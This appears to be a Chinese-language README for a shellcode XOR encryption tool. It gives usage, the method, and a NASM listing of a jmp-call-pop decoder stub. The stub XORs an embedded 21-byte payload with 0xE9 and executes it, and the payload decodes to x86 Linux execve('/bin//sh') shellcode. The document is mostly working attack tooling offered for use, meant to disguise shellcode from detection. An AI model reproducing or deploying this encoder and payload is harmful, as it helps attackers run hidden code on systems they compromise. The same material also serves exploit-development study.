简介 : 
```
shellcode 加密工具
```
使用方法 : 
```
	python ShellcodeEncrypter.py [SHELLCODE_FILE] [PASSWORD]
```
原理 :
```
1. 读取shellcode
2. 根据用户输入的 password 将 shellcode 每一个字节与 password 异或
3. 构建 shellcode 的加载器
4. 将新的 shellcode 写入新的文件
```
注意事项 : 
```
1. 密码只可以为数字 , 范围是 0 - 255
```
参考代码 : 
```
global _start
	; this shell code will xor every byte of 'encrypt' segment , then execute them
	; password is 0xe9 = 233
	_start:
		jmp jocker
		loader:
			pop esi ; get address of encrypted shellcode	
			xor ecx, ecx
			mov cl, 21 ; loop times (length of encrypt shellcode)
			decrypt:
				mov al, [esi]
				xor al, 0e9H
				mov [esi], al
				inc esi
				loop decrypt
				jmp encrypt

	jocker:
		call loader
	encrypt:
		db 0d8H
		db 20H
		db 0b8H
		db 81H
		db 0c6H
		db 0c6H
		db 9aH
		db 81H
		db 81H
		db 0c6H
		db 8bH
		db 80H
		db 87H
		db 60H
		db 0aH
		db 83H
		db 0e2H
		db 0b1H
		db 70H
		db 24H
		db 69H

```
